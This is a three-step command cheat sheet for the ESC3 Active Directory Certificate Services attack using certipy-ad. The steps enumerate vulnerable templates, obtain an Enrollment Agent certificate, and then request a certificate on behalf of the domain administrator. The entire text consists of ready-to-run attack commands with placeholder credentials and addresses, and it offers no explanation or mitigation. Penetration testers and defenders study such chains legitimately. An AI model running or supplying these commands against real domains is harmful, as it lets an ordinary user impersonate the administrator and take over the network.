# Find ESC3 templates
certipy-ad find -u user@domain.local -p pass -dc-ip $DC -vulnerable

# Request enrollment agent certificate
certipy-ad req -u user@domain.local -p pass -dc-ip $DC -target CA_IP -template EnrollmentAgent

# Request certificate on behalf of administrator
certipy-ad req -u user@domain.local -p pass -dc-ip $DC -target CA_IP -template User -on-behalf-of domain.local\\administrator -pfx enrollment_agent.pfx